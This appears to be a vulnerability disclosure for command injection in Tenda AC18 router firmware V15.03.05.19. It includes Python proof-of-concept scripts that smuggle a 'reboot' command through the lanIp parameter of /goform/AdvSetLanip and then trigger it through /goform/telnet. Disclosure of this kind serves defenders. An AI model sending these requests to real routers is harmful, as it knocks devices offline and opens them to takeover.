## Overview

- The device's official website: https://www.tenda.com.cn/product/A18.html
- Firmware download website: https://www.tenda.com.cn/material/show/2683

## Affected version

V15.03.05.19(6318)

## Vulnerability details

In the TendaAC18 Firmware has a command injection vulnerability in the `/goform/AdvSetLanip` url. The `s1` variable receives the `lanIp` parameter from a POST request and is stored in the configuration item named `lan.ip` through the SetValue function.

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20250926_181207.png)

`lan.ip` configuration item can  be retrieved through the GetValue function in the `/goform/telnet` url.However, neither the GetValue function nor the SetValue function impose any restrictions on the length of variables, which can lead to command injection.

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20250926_181521.png)

## PoC

first SetValue

```python
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/AdvSetLanip"
payload = "127.0.0.1; reboot"

data = {"lanIp":payload}
response = requests.post(url, data=data)
print(response.text)
```

second GetValue

```python
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/telnet"
response = requests.post(url)
print(response.text)
```

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20250926141817071.png)